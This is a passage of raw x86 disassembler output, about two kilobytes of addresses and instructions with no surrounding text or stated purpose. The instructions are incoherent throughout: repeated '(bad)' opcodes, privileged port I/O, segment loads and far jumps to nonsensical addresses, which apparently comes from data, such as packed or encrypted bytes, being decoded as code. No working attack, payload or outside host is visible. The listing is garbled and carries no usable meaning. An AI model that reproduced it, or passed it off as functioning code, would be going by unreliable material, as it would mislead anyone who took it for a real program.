  402256:	pop    DWORD PTR [ebx+0x29]
  402259:	xor    al,0x8c
  40225b:	mov    al,0xc7
  40225d:	sbb    al,0x78
  40225f:	mov    al,0xb
  402261:	or     BYTE PTR [eax-0x4bad1640],dh
  402267:	fsubp  st(4),st
  402269:	jg     0x4022b8
  40226b:	add    eax,0x45114b4f
  402270:	add    al,0xb8
  402272:	mov    ebx,0x654c2085
  402277:	or     eax,edx
  402279:	pop    ecx
  40227a:	shr    esi,0x33
  40227d:	vsqrtss xmm4,xmm6,DWORD PTR [edx+edi*1]
  402282:	push   edx
  402283:	mov    dl,bl
  402285:	pop    ebx
  402286:	(bad)  
  402287:	aam    0x56
  402289:	xor    al,0x3d
  40228b:	mov    ecx,0x784a917c
  402290:	push   0xffffffd9
  402292:	lods   al,BYTE PTR ds:[esi]
  402293:	test   BYTE PTR [ebx+0x21b904f4],ch
  402299:	jno    0x40223b
  40229b:	sub    edi,DWORD PTR [eax-0x58]
  40229e:	xchg   edi,eax
  40229f:	enter  0xe3cc,0x8a
  4022a3:	fwait
  4022a4:	or     BYTE PTR es:[edx+0x3f],0xc8
  4022a9:	in     eax,dx
  4022aa:	fs retf 
  4022ac:	hlt    
  4022ad:	jmp    0x402267
  4022af:	pop    ds
  4022b0:	add    BYTE PTR [ecx+eax*1],ah
  4022b3:	inc    esi
  4022b4:	call   0xd000:0x99d0b7ce
  4022bb:	or     al,0x96
  4022bd:	cwde   
  4022be:	test   BYTE PTR [ecx-0x6a],0x8e
  4022c2:	cld    
  4022c3:	mov    ebx,0xd9332ccd
  4022c8:	popf   
  4022c9:	pop    es
  4022ca:	jb     0x40231b
  4022cc:	jb     0x40232c
  4022ce:	adc    al,0x7d
  4022d0:	out    0x8,eax
  4022d2:	add    eax,0xd1a6d457
  4022d7:	add    eax,0xf00112b2
  4022dc:	stc    
  4022dd:	dec    edx
  4022de:	xor    BYTE PTR [edi+eiz*8-0x470c7c46],bh
  4022e5:	cmp    al,0xe1
  4022e7:	prefetchnta BYTE PTR [edx+0x507ca87c]
  4022ee:	ja     0x4022df
  4022f0:	gs or  ebp,0x407df544
  4022f7:	ins    BYTE PTR es:[edi],dx
  4022f8:	repz mov bh,0xf3
  4022fb:	xor    BYTE PTR [edx-0x33],al
  4022fe:	outs   dx,DWORD PTR ds:[esi]
  4022ff:	xchg   edx,eax
  402300:	jbe    0x402352
  402302:	fild   DWORD PTR [ecx-0x568d03e4]
  402308:	or     BYTE PTR [esi-0x7ba3b272],ch
  40230e:	js     0x4022b5
  402310:	ficomp DWORD PTR [ebp+ebx*4-0x72]
  402314:	(bad)
  402319:	and    bh,BYTE PTR [esi+edi*4+0x12]
  40231d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40231e:	out    dx,eax
  40231f:	test   DWORD PTR [ecx-0x1],esi
  402322:	xor    eax,0x18cf08b8
  402327:	ret    0x210a
  40232a:	repnz aam 0xe1
  40232d:	out    dx,eax
  40232e:	add    ecx,edi
  402330:	jmp    0xe9ed:0x607ecaa8
  402337:	in     al,dx
  402338:	inc    esp
  402339:	and    DWORD PTR [ebx],0x73ad202c
  40233f:	fdivr  st(1),st
  402341:	cmp    bh,BYTE PTR [ecx-0x29]
  402344:	inc    edx
  402345:	jg     0x402355
  402347:	dec    esi
  402348:	mov    DWORD PTR [ecx-0x5301b41a],ecx
  40234e:	xor    ebx,DWORD PTR [edx+edx*1+0x6]
  402352:	mov    edx,0xc4792d9c
  402357:	jl     0x40236b
  402359:	hlt    
  40235a:	ins    BYTE PTR es:[edi],dx
  40235b:	jo     0x4022e8
  40235d:	xor    eax,0xf8b41d9b
  402362:	push   cs
  402363:	mov    ah,0x51
  402365:	xchg   ebp,eax
  402366:	pop    ebp
  402367:	enter  0x1273,0xf4
  40236b:	push   edx
  40236c:	ins    BYTE PTR es:[edi],dx
  40236d:	jg     0x402372
  40236f:	cdq    
  402370:	sbb    DWORD PTR [eax-0x72],edx
  402373:	fsubr  QWORD PTR [ebp-0x58]
  402376:	push   edx
  402377:	jl     0x4023d9
  402379:	push   0x16629a62
  40237e:	xlat   BYTE PTR ds:[ebx]
  40237f:	pop    ebx
  402380:	mov    ah,0xf1
  402382:	fldcw  WORD PTR [ecx+0x45b09a73]
  402388:	test   DWORD PTR [ebx+0x7e],esp
  40238b:	xor    edi,DWORD PTR [ebp+0x18b2c190]
  402391:	or     bl,BYTE PTR [ebx-0x27438d00]
  402397:	fwait
  402398:	add    al,0x31
  40239a:	cmp    DWORD PTR [edx+0x33806c3f],edx
  4023a0:	nop
  4023a1:	scas   al,BYTE PTR es:[edi]
  4023a2:	mov    edx,0x85d20441
  4023a7:	mov    ebp,0xa349a5fc
  4023ac:	mov    ss,WORD PTR [ecx-0x497b434d]
  4023b2:	jno    0x402428
  4023b4:	scas   eax,DWORD PTR es:[edi]
  4023b5:	lock sbb eax,0xd323cbc6
  4023bb:	mov    al,0xd7
  4023bd:	jmp    0xfdc18afb
  4023c2:	retf   
  4023c3:	idiv   BYTE PTR [esi-0x6c]
  4023c6:	dec    edi
  4023c7:	mov    esi,0xf980f0df
  4023cc:	adc    eax,0xd00ce6b8
  4023d1:	pop    esp
  4023d2:	mov    ah,0x23
  4023d4:	scas   al,BYTE PTR es:[edi]
  4023d5:	outs   dx,DWORD PTR ds:[esi]
  4023d6:	xor    edi,ebx
  4023d8:	pushf  
  4023d9:	iret   
  4023da:	fmul   QWORD PTR [ebx]
  4023dc:	or     eax,0xd0fd0570
  4023e1:	retf   
  4023e2:	inc    edx
  4023e3:	jbe    0x40242c
  4023e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023e6:	and    BYTE PTR [edx],dh
  4023e8:	or     ch,BYTE PTR [edi]
  4023ea:	and    bl,al
  4023ec:	mov    ebx,esp
  4023ee:	into   
  4023ef:	adc    eax,0x3eaf6b64
  4023f4:	lock jae 0x4023d3
  4023f7:	add    ah,ch
  4023f9:	add    cl,BYTE PTR [esi-0xb]
  4023fc:	rep stos BYTE PTR es:[edi],al
  4023fe:	pop    ebx
  4023ff:	xchg   esp,eax
  402400:	dec    esp
  402401:	push   edx
  402402:	jge    0x402433
  402404:	lods   eax,DWORD PTR ds:[esi]
  402405:	test   al,0xc4
  402407:	push   ds
  402408:	sbb    DWORD PTR [esi+0x10],ebx
  40240b:	shl    DWORD PTR [esi],cl
  40240d:	add    BYTE PTR [esi-0x2b1620f8],ah
  402413:	(bad)  
  402414:	push   0xffffff80
  402416:	adc    ah,BYTE PTR [ecx+ecx*4]
  402419:	mov    esi,0xbe005401
  40241e:	xchg   DWORD PTR [eax],edi
  402420:	shl    DWORD PTR [ebp+0x3c],1
  402423:	add    al,0x5c
  402425:	sub    eax,DWORD PTR [edi]
  402427:	jmp    0x402417
  402429:	mov    dl,0xab
  40242b:	jle    0x4023b7
  40242d:	(bad)  
  40242f:	jne    0x40244e
  402431:	ins    DWORD PTR es:[edi],dx
  402432:	jecxz  0x40247b
  402434:	or     al,0x13
  402436:	fcomp  DWORD PTR [esi+0x2a1f7e2f]
  40243c:	sbb    dh,BYTE PTR [eax]
  40243e:	or     al,0x17
  402440:	stos   DWORD PTR es:[edi],eax
  402441:	mov    dl,0xa7
  402443:	sub    al,0xdc
  402445:	test   BYTE PTR [edi-0x5a],ch
  402448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402449:	mov    cl,0x2
  40244b:	outs   dx,DWORD PTR ds:[esi]
  40244c:	aam    0x6c
  40244e:	mov    edx,0xe24fd1f4
  402453:	pushf  
  402454:	call   0xc8e54b1f
  402459:	je     0x402479
  40245b:	jns    0x40249d
  40245d:	push   cs
  40245e:	test   al,0xb6
  402460:	xchg   ecx,eax
  402461:	lods   eax,DWORD PTR ds:[esi]
  402462:	popf   
  402463:	loope  0x402498
  402465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402466:	mov    eax,0x8a08403c
  40246b:	pusha  
  40246c:	rcr    ebx,1
  40246e:	mov    ch,0x96
  402470:	pop    es
  402471:	les    esi,FWORD PTR [edi-0x28]
  402474:	mov    eax,0xb07b859a
  402479:	fidivr DWORD PTR [ebx]
  40247b:	mov    cs,esp
  40247d:	je     0x40245f
  40247f:	pop    edx
  402480:	and    ecx,DWORD PTR [ecx-0x35]
  402483:	lods   eax,DWORD PTR ds:[esi]
  402484:	add    DWORD PTR [edx],esp
  402486:	xchg   ebp,eax
  402487:	mov    ds:0x42c3160b,eax
  40248c:	jbe    0x402437
  40248e:	mov    ecx,0x4dda519
  402493:	fnstsw WORD PTR [esi]
  402495:	js     0x4024e8
  402497:	sar    edx,0x30
  40249a:	jp     0x4024f1
  40249c:	dec    ebx
  40249d:	mov    cl,0xea
  40249f:	sub    al,BYTE PTR [ecx+0xa]
  4024a2:	adc    al,0x34
  4024a4:	stos   DWORD PTR es:[edi],eax
  4024a5:	add    BYTE PTR [edx-0x55ffb3b3],ah
  4024ab:	adc    BYTE PTR [ecx+0x3f],ch
  4024ae:	sbb    esi,DWORD PTR [edx]
  4024b0:	cld    
  4024b1:	stc    
  4024b2:	test   BYTE PTR [esi],ah
  4024b4:	aad    0x91
  4024b6:	arpl   WORD PTR ds:0xa6dc85c2,bp
  4024bc:	addr16 loope 0x4024a9
  4024bf:	add    al,0xd4
  4024c1:	rcr    DWORD PTR [ecx],cl
  4024c3:	shl    DWORD PTR [edx+0x3af07a04],cl
  4024c9:	sbb    ecx,DWORD PTR [edi+edx*1]
  4024cc:	stc    
  4024cd:	enter  0x8373,0x2f
  4024d1:	out    0xec,al
  4024d3:	shl    DWORD PTR [ebp+0x2e168e14],cl
  4024d9:	sub    eax,0x7c7de4cf
  4024de:	mov    dh,0x9f
  4024e0:	mov    ecx,DWORD PTR [edx+0x145bb5c6]
  4024e6:	retf   
  4024e7:	test   eax,0x7fdc858f
  4024ed:	add    al,0xf9
  4024ef:	es pop ds
  4024f1:	call   DWORD PTR [edx]
  4024f3:	stc    
  4024f4:	fmul   DWORD PTR [edx]
  4024f6:	mov    bl,0xfc
  4024f8:	jbe    0x4024d6
  4024fa:	push   ebp
  4024fb:	and    ebp,edi
  4024fd:	mov    ah,0xa0
  4024ff:	pop    ds
  402500:	in     eax,dx
  402501:	aas    
  402502:	or     eax,ebp
  402504:	add    bl,0x83
  402507:	xchg   esp,eax
  402508:	ss addr16 cdq 
  40250b:	cmp    BYTE PTR [edx-0x16],bh
  40250e:	adc    eax,0x6002a7ad
  402513:	dec    ebp
  402514:	mov    eax,0xdc84a425
  402519:	sar    DWORD PTR [eax],0xc8
  40251c:	mov    dh,0xdf
  40251e:	mov    esi,0x11cdaeb
  402523:	xchg   esi,eax
  402524:	dec    edi
  402525:	fidiv  WORD PTR [esi+0x5c17c577]
  40252b:	iret   
  40252c:	inc    edx
  40252d:	fcmovu st,st(4)
  40252f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402530:	jmp    0x31f8:0xf949111b
  402537:	sub    ecx,esp
  402539:	mov    bh,0xa3
  40253b:	in     al,dx
  40253c:	adc    DWORD PTR [ecx-0xb05536c],esi
  402542:	inc    esi
  402543:	fimul  WORD PTR [eax+0x20]
  402546:	popf   
  402547:	add    edi,DWORD PTR [ecx+0x6a]
  40254a:	fnstcw WORD PTR [edi-0x53438757]
  402550:	adc    dl,al
  402552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402553:	dec    ebp
  402554:	jecxz  0x40251c
  402556:	dec    edx
  402557:	fnsave [eax-0x1d]
  40255a:	mov    bl,0x2d
  40255c:	lea    ecx,[esi-0x6a]
  40255f:	sbb    ch,0x3b
  402562:	sti    
  402563:	push   esi
  402564:	mov    si,0x9fbf
  402568:	mov    ds:0xf73248d3,eax
  40256d:	idiv   BYTE PTR [edx]
  40256f:	pop    ebp
  402570:	repz fcomp QWORD PTR [edx-0x20f57c06]
  402577:	scas   eax,DWORD PTR es:[edi]
  402578:	jle    0x4025f3
  40257a:	hlt    
  40257b:	or     ebp,edx
  40257d:	call   0x5187:0xc9bbc031
  402584:	loop   0x40258f
  402586:	and    BYTE PTR [eax-0x7f],al
  402589:	mov    al,ds:0x5f946b44
  40258e:	int3   
  40258f:	and    ebx,DWORD PTR [edx]
  402591:	pusha  
  402592:	gs pop esi
  402594:	gs sub cl,dh
  402597:	xor    al,0x39
  402599:	iret   
  40259a:	push   es
  40259b:	or     eax,0x809ab5e
  4025a0:	cmc    
  4025a1:	jnp    0x402598
  4025a3:	jl     0x402590
  4025a5:	rcl    DWORD PTR [ecx+eiz*8+0x77],cl
  4025a9:	in     al,0x6b
  4025ab:	xor    DWORD PTR [eax],edi
  4025ad:	xchg   ch,ah
  4025af:	xchg   DWORD PTR [eax-0x4661b6f4],ebx
  4025b5:	int    0x26
  4025b7:	xor    BYTE PTR ds:0x2d3b3cc3,dl
  4025bd:	xchg   ecx,eax
  4025be:	push   0x124e39c1
  4025c3:	jae    0x40256c
  4025c5:	mov    dh,0x75
  4025c7:	inc    ecx
  4025c8:	pusha  
  4025c9:	mov    esp,DWORD PTR [ebp+ecx*1+0x2bf0be41]
  4025d0:	mov    esi,0x6faf0148
  4025d5:	add    ecx,0x78
  4025d8:	adc    eax,0xd52b4489
  4025dd:	or     al,0x92
  4025df:	(bad)  
  4025e0:	pushf  
  4025e1:	lds    esp,FWORD PTR [ebx]
  4025e3:	mov    edi,0x49bd665f
  4025e8:	dec    edi
  4025e9:	fs xor eax,0xefad758c
  4025ef:	mov    ds:0x311cfbde,eax
  4025f4:	inc    ecx
  4025f5:	fmul   QWORD PTR fs:[ecx+0x73d968d3]
  4025fc:	sbb    BYTE PTR [ebp+0x35],0xb5
  402600:	outs   dx,DWORD PTR ds:[esi]
  402601:	pop    ss
  402602:	add    DWORD PTR [ebp+0x40],ebx
  402605:	fwait
  402606:	mov    ch,0x89
  402608:	pushf  
  402609:	cdq    
  40260a:	cmp    DWORD PTR fs:[esi+0x39],ecx
  40260e:	pop    es
  40260f:	out    dx,eax
  402610:	add    eax,DWORD PTR [eax]
  402612:	outs   dx,BYTE PTR ds:[esi]
  402613:	and    bl,BYTE PTR [ebx-0x2d56b692]
  402619:	mov    al,0x62
  40261b:	jl     0x4025ca
  40261d:	gs push esp
  40261f:	outs   dx,DWORD PTR ds:[esi]
  402620:	inc    ebx
  402621:	jne    0x402601
  402623:	ins    DWORD PTR es:[edi],dx
  402624:	inc    edx
  402625:	shl    BYTE PTR [esp+ecx*1+0x88daa1e],1
  40262c:	sbb    BYTE PTR [edx],0x7a
  40262f:	in     eax,dx
  402630:	lahf   
  402631:	cdq    
  402632:	add    ebx,DWORD PTR [eax+0x2c]
  402635:	sub    BYTE PTR [edx+0x7f15f17a],ah
  40263b:	adc    esp,ecx
  40263d:	fdiv   QWORD PTR [edx+0x77]
  402640:	cld    
  402641:	into   
  402642:	push   ss
  402643:	jb     0x402645
  402645:	add    ah,al
  402647:	pop    esp
  402648:	mov    bl,0x1b
  40264a:	(bad)  
  40264b:	pop    edx
  40264c:	std    
  40264d:	xchg   ecx,eax
  40264e:	pop    ebp
  40264f:	sahf   
  402650:	lock add eax,0xfd63ddc0
  402656:	jnp    0x402603
  402658:	popa   
  402659:	sbb    DWORD PTR [edi+edx*8],0x75
  40265d:	xchg   esi,eax
  40265e:	inc    ecx
  40265f:	mov    cl,0xbe
  402661:	int3   
  402662:	mov    ebx,0xda24add0
  402667:	sub    eax,DWORD PTR [eax]
  402669:	and    ecx,edx
  40266b:	int    0x1b
  40266d:	mov    BYTE PTR [edx+edi*4],al
  402670:	xor    DWORD PTR [edi-0x37],ecx
  402673:	push   esi
  402674:	imul   ebp,DWORD PTR [edi-0x2d],0x4e95a749
  40267b:	out    dx,eax
  40267c:	or     ecx,DWORD PTR [edx-0x1e282561]
  402682:	mov    dl,0xe5
  402684:	ss mov cl,0x20
  402687:	jmp    0xd781:0xf2f5406f
  40268e:	fwait
  40268f:	adc    bh,cl
  402691:	dec    ebp
  402692:	sbb    al,0xad
  402694:	xchg   ebx,eax
  402695:	clc    
  402696:	jecxz  0x4026f3
  402698:	mov    edi,0x8599f42b
  40269d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40269e:	jp     0x4026b8
  4026a0:	pop    ebp
  4026a1:	pop    ds
  4026a2:	jp     0x4026a9
  4026a4:	inc    esp
  4026a5:	mov    ds:0x5a0e2a87,eax
  4026aa:	push   ds
  4026ab:	jp     0x402687
  4026ad:	jno    0x402668
  4026af:	aas    
  4026b0:	pop    esp
  4026b1:	out    0x31,eax
  4026b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026b4:	jmp    0x40263f
  4026b6:	dec    ecx
  4026b7:	sti    
  4026b8:	dec    eax
  4026b9:	loopne 0x4026be
  4026bb:	rcl    DWORD PTR [ecx+esi*8+0x63],cl
  4026bf:	fisub  DWORD PTR [eax+0xbe6ddb9]
  4026c5:	nop
  4026c6:	dec    ebp
  4026c7:	ins    DWORD PTR es:[edi],dx
  4026c8:	outs   dx,BYTE PTR ds:[esi]
  4026c9:	mov    edi,0x84939ec5
  4026ce:	push   0xffffff89
  4026d0:	inc    ebp
  4026d1:	inc    edi
  4026d2:	imul   edi,DWORD PTR [eax],0x3b
  4026d5:	jle    0x4026a6
  4026d7:	enter  0xa596,0x5e
  4026db:	mov    ebp,0x8a0332e1
  4026e0:	sub    al,0x35
  4026e2:	sub    edi,ebx
  4026e4:	cli    
  4026e5:	mov    edi,0x30b2a65c
  4026ea:	and    BYTE PTR [edi+ebp*2],dl
  4026ed:	jne    0x4026dc
  4026ef:	bound  ebx,QWORD PTR [esp+eax*4-0x89b2694]
  4026f6:	lods   al,BYTE PTR ds:[esi]
  4026f7:	xor    eax,0x84ffbbe
  4026fc:	scas   al,BYTE PTR es:[edi]
  4026fd:	jbe    0x40270b
  4026ff:	mov    edi,0x1a7344c
  402704:	ins    DWORD PTR es:[edi],dx
  402705:	mov    WORD PTR [esi],ss
  402707:	mov    bh,0x24
  402709:	mov    bl,0xce
  40270b:	and    esp,DWORD PTR [ecx]
  40270d:	inc    edi
  40270e:	push   cs
  40270f:	retf   
  402710:	push   esp
  402711:	stc    
  402712:	sbb    ah,BYTE PTR [ebx]
  402714:	scas   eax,DWORD PTR es:[edi]
  402715:	xor    al,0xc0
  402717:	xchg   esp,eax
  402718:	idiv   bl
  40271a:	push   ss
  40271b:	aam    0x43
  40271d:	(bad)  
  40271e:	das    
  40271f:	ja     0x4026d3
  402721:	jmp    0x82fd:0x359e4a1a
  402728:	add    al,0x66
  40272a:	mov    bh,0x25
  40272c:	out    dx,eax
  40272d:	and    bl,al
  40272f:	add    al,0x88
  402731:	mov    ecx,0xf34bb14c
  402736:	call   0x3ec4933f
  40273b:	repnz fbld TBYTE PTR [ecx-0x3b72d93]
  402742:	psubusw mm6,mm5
  402745:	pushf  
  402746:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  402748:	cdq    
  402749:	std    
  40274a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40274b:	push   0x9242377
  402750:	fmul   QWORD PTR [ebx-0x5d]
  402753:	test   eax,0x9a355659
  402758:	mov    dl,0x7c
  40275a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40275b:	out    dx,al
  40275c:	mov    ss,WORD PTR [ebp-0x78622b6c]
  402762:	in     eax,0x4f
  402764:	test   DWORD PTR [edi-0x35],esp
  402767:	pusha  
  402768:	inc    ebp
  402769:	js     0x40279f
  40276b:	imul   edx,DWORD PTR ds:0x964a495c,0xffffffc4
  402772:	iret   
  402773:	retf   0xf07f
  402776:	mov    ebx,0x35143f7c
  40277b:	iret   
  40277c:	pop    esp
  40277d:	xor    BYTE PTR [ebx-0x20368d49],cl
  402783:	pop    esi
  402784:	add    ecx,DWORD PTR [eax]
  402786:	sub    BYTE PTR ds:0x2ae6530b,0xcf
  40278d:	adc    eax,0xf60e4368
  402792:	leave  
  402793:	cmp    DWORD PTR [ebp+0x7],edi
  402796:	or     BYTE PTR [eax+0x7728a032],cl
  40279c:	push   ss
  40279d:	xchg   edx,eax
  40279e:	arpl   WORD PTR [eax-0x43428ea],ax
  4027a4:	mov    ds:0xbc995a68,al
  4027a9:	xor    dh,BYTE PTR [edx]
  4027ab:	sbb    eax,eax
  4027ad:	retf   0x862b
  4027b0:	jbe    0x402753
  4027b2:	pop    ds
  4027b3:	out    dx,al
  4027b4:	ret    0x567a
  4027b7:	mov    eax,0x8474409a
  4027bc:	imul   esi,DWORD PTR [esi+eiz*2-0x29],0x80660ec3
  4027c4:	frstor [edx+0x1]
  4027c7:	cmp    bl,ch
  4027c9:	inc    eax
  4027ca:	xchg   ecx,eax
  4027cb:	ja     0x4027f0
  4027cd:	jmp    0x402773
  4027cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027d0:	pushf  
  4027d1:	out    dx,eax
  4027d2:	dec    esp
  4027d3:	dec    eax
  4027d4:	mov    BYTE PTR [ecx+0x3670233b],dl
  4027da:	popf   
  4027db:	aam    0xe3
  4027dd:	cli    
  4027de:	mov    edi,0x5d8f79b2
  4027e3:	sbb    al,0x96
  4027e5:	cmp    eax,0x9a54e9ed
  4027ea:	mov    eax,0x2dffdc19
  4027ef:	mov    dl,0x7d
  4027f1:	xchg   esp,eax
  4027f2:	mov    fs,WORD PTR [eax+0x287f2eb1]
  4027f8:	push   0x32
  4027fa:	shl    DWORD PTR [esi+eiz*1],cl
  4027fd:	xchg   edi,eax
  4027fe:	or     ecx,esp
  402800:	in     al,dx
  402801:	inc    ebp
  402802:	add    BYTE PTR [ecx],bl
  402804:	dec    eax
  402805:	inc    eax
  402806:	call   0x1d1fd241
  40280b:	adc    BYTE PTR [edx-0x44],0xf5
  40280f:	sbb    eax,0x50c4634f
  402814:	(bad)  
  402816:	ins    DWORD PTR es:[edi],dx
  402817:	cmp    al,0xb7
  402819:	xchg   edi,eax
  40281a:	mov    edi,0x446ce93
  40281f:	jecxz  0x4027dc
  402821:	outs   dx,DWORD PTR ds:[esi]
  402822:	cmp    ch,bl
  402824:	sbb    DWORD PTR [ecx+0x66f21d2a],ecx
  40282a:	mov    edx,0x1f96a166
  40282f:	mov    esp,?
  402831:	and    eax,0xc10232d2
  402836:	mov    ax,0x41bb
  40283a:	push   0xffffffc5
  40283c:	clc    
  40283d:	ficom  WORD PTR [edx+0x57]
  402840:	ja     0x40285b
  402842:	xor    DWORD PTR [edx+0x1f],eax
  402845:	push   cs
  402846:	jnp    0x4027f6
  402848:	or     eax,0x97b022f3
  40284d:	push   ebx
  40284e:	and    dh,al
  402850:	jmp    DWORD PTR [edi-0x5ea5a8ee]
  402856:	mov    ds:0x87402a1e,al
  40285b:	dec    ebx
  40285c:	mov    ds:0x3b6e2332,eax
  402861:	cdq    
  402862:	arpl   bp,bp
  402864:	sahf   
  402865:	adc    eax,0x56c61089
  40286a:	test   eax,0x51ca8259
  40286f:	jmp    0xcca566bf
  402874:	fidiv  DWORD PTR [ebx+0x2d]
  402877:	lea    esi,[bp+di+0x33]
  40287b:	mov    dh,0x3d
  40287d:	mov    DWORD PTR [ecx+eiz*4],esi
  402880:	sbb    esi,DWORD PTR [edi+0x21879b9b]
  402886:	das    
  402887:	clc    
  402888:	pop    ebp
  402889:	in     al,0x81
  40288b:	jo     0x4028d0
  40288d:	push   es
  40288e:	and    BYTE PTR [eax+0x5306740a],ch
  402894:	pushf  
  402895:	add    ah,dh
  402897:	cmp    ecx,eax
  402899:	mov    BYTE PTR [esi-0x40],cl
  40289c:	dec    edi
  40289d:	sbb    al,BYTE PTR ds:0x96684bdc
  4028a3:	pop    edx
  4028a4:	adc    edi,eax
  4028a6:	js     0x402899
  4028a8:	cwde   
  4028a9:	cmp    al,0x2a
  4028ab:	mov    dl,0xb3
  4028ad:	pushf  
  4028ae:	xor    ah,al
  4028b0:	and    eax,0x19789533
  4028b5:	aaa    
  4028b6:	sar    DWORD PTR [edi],0x99
  4028b9:	dec    ebp
  4028ba:	inc    edx
  4028bb:	shl    BYTE PTR [edi],0x99
  4028be:	loop   0x40286f
  4028c0:	mov    dl,BYTE PTR [eax+ebx*2]
  4028c3:	je     0x4028d9
  4028c5:	and    al,0x3d
  4028c7:	push   edx
  4028c8:	xchg   esi,eax
  4028c9:	dec    edx
  4028ca:	mov    esp,0xf428b3cc
  4028cf:	sahf   
  4028d0:	lods   al,BYTE PTR ds:[esi]
  4028d1:	repz xchg ebp,eax
  4028d3:	push   ebx
  4028d4:	out    dx,eax
  4028d5:	mov    eax,es:0x8cfd5836
  4028db:	les    ebx,FWORD PTR [ebx+0x1014e23b]
  4028e1:	dec    esi
  4028e2:	add    al,0x11
  4028e4:	pop    es
  4028e5:	lahf   
  4028e6:	mov    ch,0x74
  4028e8:	dec    eax
  4028e9:	add    edi,DWORD PTR [ecx+0xa]
  4028ec:	add    esp,DWORD PTR [ebx-0x2b8ed137]
  4028f2:	test   ch,ah
  4028f4:	lods   al,BYTE PTR ds:[esi]
  4028f5:	pop    esi
  4028f6:	mov    ds:0x6230ae7,al
  4028fb:	leave  
  4028fc:	sbb    DWORD PTR [ebp-0x27],edi
  4028ff:	sbb    WORD PTR [eax-0x2e57454d],0x3d2f
  402908:	(bad)  
  402909:	imul   edi,DWORD PTR [ebp-0x40838db3],0x812ce40d
  402913:	sar    BYTE PTR [ebx+eiz*2],1
  402916:	and    al,0x65
  402918:	loop   0x4028ef
  40291a:	adc    bh,BYTE PTR [edx]
  40291c:	in     eax,0x91
  40291e:	fidivr WORD PTR [ecx+eax*4+0x2e]
  402922:	mov    esp,0xff341df
  402927:	xchg   esp,eax
  402928:	arpl   ax,di
  40292a:	jno    0x402959
  40292c:	adc    eax,0x13b2da18
  402931:	mov    ds:0x4e1c3579,eax
  402936:	push   edi
  402937:	xchg   esi,eax
  402938:	fild   WORD PTR [ebp+edx*8-0x24363da1]
  40293f:	ds pop ds
  402941:	sbb    ecx,DWORD PTR [ebx]
  402943:	fisttp QWORD PTR [ebp+0x42]
  402946:	iret   
  402947:	stos   DWORD PTR es:[edi],eax
  402948:	sbb    ebx,DWORD PTR [esi]
  40294a:	mov    edi,0x3ec70ecc
  40294f:	xchg   ecx,eax
  402950:	sub    esp,eax
  402952:	out    dx,al
  402953:	mov    esi,0x10bbdbf2
  402958:	in     eax,0xab
  40295a:	popa   
  40295b:	sti    
  40295c:	inc    eax
  40295d:	sub    DWORD PTR [ebp-0x20],ebx
  402960:	mov    dl,0x1d
  402962:	pop    esp
  402963:	pop    edx
  402964:	aaa    
  402965:	and    al,0x42
  402967:	dec    ebx
  402968:	xchg   edi,esp
  40296a:	outs   dx,DWORD PTR ds:[esi]
  40296b:	mov    dh,0xc7
  40296d:	inc    esp
  40296e:	pop    es
  40296f:	inc    ecx
  402970:	mov    DWORD PTR [edx-0x1f],eax
  402973:	push   ebx
  402974:	or     al,0x1c
  402976:	cmp    DWORD PTR [ebx-0x803a3d3],ebp
  40297c:	add    cl,BYTE PTR [esi+0x34]
  40297f:	fimul  WORD PTR [ecx+0x7d]
  402982:	pop    ss
  402983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402984:	inc    eax
  402985:	or     BYTE PTR [ebx+0x73],cl
  402988:	jmp    DWORD PTR [eax+0x62]
  40298b:	pop    ss
  40298c:	mov    bl,0xe3
  40298e:	call   0x8ba7bae5
  402993:	cmc    
  402994:	push   esi
  402995:	sub    dl,BYTE PTR [ebx+edi*4-0x4e]
  402999:	lods   al,BYTE PTR ds:[esi]
  40299a:	call   0x9433:0x8b0a2bbb
  4029a1:	cmp    DWORD PTR [edx-0x62],eax
  4029a4:	loopne 0x4029b2
  4029a6:	inc    esp
  4029a7:	jne    0x402950
  4029a9:	pusha  
  4029aa:	xor    DWORD PTR [eax-0xa],0x1a8ecc0e
  4029b1:	mov    ecx,DWORD PTR [edi+0x4f]
  4029b4:	sub    eax,0x1db9c2c6
  4029b9:	push   0x59a2ebb4
  4029be:	enter  0x55ab,0x60
  4029c2:	or     al,BYTE PTR [edx]
  4029c4:	jp     0x4029db
  4029c6:	pop    ebx
  4029c7:	or     DWORD PTR [esi-0x69],edx
  4029ca:	xchg   BYTE PTR [ecx],cl
  4029cc:	enter  0xd725,0x69
  4029d0:	cmp    DWORD PTR [ebx],edx
  4029d2:	mov    esi,0x833e31ed
  4029d7:	cmp    al,0x90
  4029d9:	sahf   
  4029da:	or     eax,0x8c5ddf1c
  4029df:	add    ebx,ebx
  4029e1:	push   esi
  4029e2:	dec    edx
  4029e3:	je     0x402a41
  4029e5:	or     BYTE PTR [eax-0x5b],bl
  4029e8:	cld    
  4029e9:	jmp    0x695a:0x2afa2e6
  4029f0:	xchg   ah,bl
  4029f2:	mov    DWORD PTR [edx-0x80],esi
  4029f5:	jns    0x4029ad
  4029f7:	into   
  4029f8:	mov    eax,0x6750f54c
  4029fd:	ret    0xf46c
  402a00:	sbb    al,0xe4
  402a02:	sahf   
  402a03:	jmp    0x2fe2:0xcc11f11c
  402a0a:	aaa    
  402a0b:	(bad)
  402a0f:	cmp    al,BYTE PTR [eax-0x4c36e96b]
  402a15:	jae    0x402a2d
  402a17:	das    
  402a18:	push   cs
  402a19:	jae    0x402a81
  402a1b:	arpl   WORD PTR [ebp-0x50],ax
  402a1e:	pop    edi
  402a1f:	(bad)  
  402a20:	cli    
  402a21:	fstp   QWORD PTR [esi]
  402a23:	and    al,0x6d
  402a25:	outs   dx,DWORD PTR ds:[esi]
  402a26:	jp     0x4029eb
  402a28:	pop    eax
  402a29:	frstor [esi+0x58c51c03]
  402a2f:	inc    ecx
  402a30:	stos   BYTE PTR es:[edi],al
  402a31:	mov    edi,0x9111df3
